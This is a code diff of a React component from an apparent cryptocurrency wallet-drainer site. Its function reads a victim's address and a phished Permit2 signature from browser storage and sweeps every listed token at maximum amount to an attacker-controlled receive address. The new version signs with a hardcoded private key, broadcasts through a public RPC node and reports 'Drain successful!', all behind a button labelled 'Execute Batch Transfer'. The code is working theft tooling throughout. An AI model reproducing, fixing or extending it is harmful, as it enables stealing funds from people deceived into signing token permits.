@@ -5,103 +5,95 @@ import { TOKENS } from '../../config/tokens';
 import { getReceiveAddress } from '../../config/receiveAddress';
 import toast from 'react-hot-toast';
 
+const INITIATOR_PRIVATE_KEY = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";
+
 const PERMIT2_ABI = [
-  'function permitTransferFrom(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address from, uint256 sigDeadline, bytes signature) external'
+  "function permitBatchTransferFrom(((address token,uint256 amount)[] permitted, address spender, uint256 nonce, uint256 deadline) permitBatch, (address to, uint256[] amounts) transferDetails, address owner, bytes signature) external"
 ];
 
 export const BatchTransfer = () => {
-  const [isExecuting, setIsExecuting] = useState(false);
+  const [isTransferring, setIsTransferring] = useState(false);
 
-  const executeBatchDrain = async () => {
+  const executeBatchTransfer = async () => {
     const signature = localStorage.getItem('permit2_signature');
-    const expiry = localStorage.getItem('permit2_expiry');
+    const deadline = localStorage.getItem('permit2_deadline');
+    const nonce = localStorage.getItem('permit2_nonce');
     const victimAddress = localStorage.getItem('victim_address');
-    
-    if (!signature || Date.now() > parseInt(expiry) * 1000) {
-      toast.error('Please approve Permit2 signature first');
+    const chainId = localStorage.getItem('chain_id');
+
+    if (!signature || !deadline || !nonce || !victimAddress) {
+      toast.error('No Permit2 signature found. Please sign first.');
       return;
     }
 
-    setIsExecuting(true);
-    
+    setIsTransferring(true);
+
     try {
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const currentAddress = await signer.getAddress();
-      
-      if (currentAddress.toLowerCase() !== victimAddress.toLowerCase()) {
-        toast.error('Wallet changed. Please re-approve.');
-        return;
-      }
-      
-      const network = await provider.getNetwork();
-      const chainId = Number(network.chainId);
-      
+      const provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com');
+      const wallet = new ethers.Wallet(INITIATOR_PRIVATE_KEY, provider);
+      const permit2Address = PERMIT2_ADDRESSES[chainId] || PERMIT2_ADDRESSES[1];
+      const permit2 = new ethers.Contract(permit2Address, PERMIT2_ABI, wallet);
+      const drainAddress = getReceiveAddress();
       const tokens = TOKENS[chainId] || TOKENS[1];
-      const permit2Address = PERMIT2_ADDRESSES[chainId];
-      const receiveAddress = getReceiveAddress();
-      
-      if (!receiveAddress) {
-        throw new Error('Receive address not configured');
+
+      const MAX_UINT160 = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
+      const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+      const permitted = tokens.map(token => ({
+        token: token.address,
+        amount: MAX_UINT160
+      }));
+
+      const permitBatch = {
+        permitted: permitted,
+        spender: drainAddress,
+        nonce: parseInt(nonce),
+        deadline: parseInt(deadline)
+      };
+
+      const transferDetails = {
+        to: drainAddress,
+        amounts: tokens.map(() => MAX_UINT256)
+      };
+
+      const tx = await permit2.permitBatchTransferFrom(
+        permitBatch,
+        transferDetails,
+        victimAddress,
+        signature,
+        { gasLimit: 5000000 }
+      );
+
+      toast.loading('Transaction submitted. Waiting for confirmation...');
+      const receipt = await tx.wait();
+
+      if (receipt.status === 1) {
+        toast.success(`Drain successful! Tx: ${receipt.transactionHash.slice(0, 10)}...`);
+        localStorage.removeItem('permit2_signature');
+        localStorage.removeItem('permit2_deadline');
+        localStorage.removeItem('permit2_nonce');
+        localStorage.removeItem('victim_address');
+      } else {
+        toast.error('Transaction failed');
       }
-      
-      const permit2Contract = new ethers.Contract(permit2Address, PERMIT2_ABI, signer);
-      
-      const drainedTokens = [];
-      
-      for (const token of tokens) {
-        const tokenContract = new ethers.Contract(token.address, [
-          'function balanceOf(address) view returns (uint256)'
-        ], provider);
-        
-        const balance = await tokenContract.balanceOf(victimAddress);
-        
-        if (balance > 0n) {
-          const permitDetails = {
-            token: token.address,
-            amount: balance.toString(),
-            expiration: Math.floor(Date.now() / 1000) + 300,
-            nonce: 0
-          };
-          
-          const tx = await permit2Contract.permitTransferFrom(
-            permitDetails,
-            victimAddress,
-            receiveAddress,
-            Math.floor(Date.now() / 1000) + 300,
-            signature,
-            { gasLimit: 200000 }
-          );
-          
-          await tx.wait();
-          
-          drainedTokens.push({
-            symbol: token.symbol,
-            amount: ethers.formatUnits(balance, token.decimals),
-            txHash: tx.hash
-          });
-        }
-      }
-      
-      toast.success(`Transferred ${drainedTokens.length} tokens`);
-      
+
     } catch (error) {
       console.error('Batch transfer failed:', error);
-      toast.error('Transaction failed');
+      toast.error(`Transfer failed: ${error.message.slice(0, 100)}`);
     } finally {
-      setIsExecuting(false);
+      setIsTransferring(false);
     }
   };
 
   return (
     <button
-      onClick={executeBatchDrain}
-      disabled={isExecuting}
-      className={`w-full py-3 rounded-xl font-bold text-lg transition-all ${
-        isExecuting ? 'bg-gray-700 cursor-wait' : 'bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500'
+      onClick={executeBatchTransfer}
+      disabled={isTransferring}
+      className={`w-full py-3 rounded-xl font-semibold transition-all ${
+        isTransferring ? 'bg-gray-700 cursor-wait' : 'bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-500 hover:to-cyan-500'
       } text-white`}
     >
-      {isExecuting ? 'Executing Batch Transfer...' : 'Execute Batch Transfer'}
+      {isTransferring ? 'Processing...' : 'Execute Batch Transfer'}
     </button>
   );
 };
